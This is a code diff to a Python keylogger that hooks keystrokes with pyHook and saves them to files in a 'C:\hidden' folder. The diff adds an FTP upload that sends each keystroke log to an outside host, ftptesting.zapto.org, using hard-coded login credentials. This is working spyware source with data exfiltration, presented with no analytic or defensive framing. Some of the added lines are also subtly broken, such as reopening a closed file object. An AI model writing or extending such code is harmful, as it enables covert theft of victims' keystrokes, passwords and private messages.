@@ -1,6 +1,7 @@
 import pyHook, pythoncom, sys, logging
 import os
 import time
+import ftplib
 
 newpath = r'C:\hidden' 
 if not os.path.exists(newpath):
@@ -25,8 +26,13 @@ def CheckTime(endtime):
 		newdoc = open('C:\\hidden\\formatted' + str(time.time()) + ".txt", "w")
 		newdoc.write(data.replace('\n', "").replace('\r', ""))
 		newdoc.close()
-		
 		t = time.time()
+		
+		session = ftplib.FTP('ftptesting.zapto.org','FtpUser','505BOGbs8')
+		file = open(newdoc,'rb')                  # file to send
+		session.storbinary('STOR newdoc', file)     # send the file
+		file.close()                                    # close file and FTP
+		session.quit()
 			
 		return  
 	
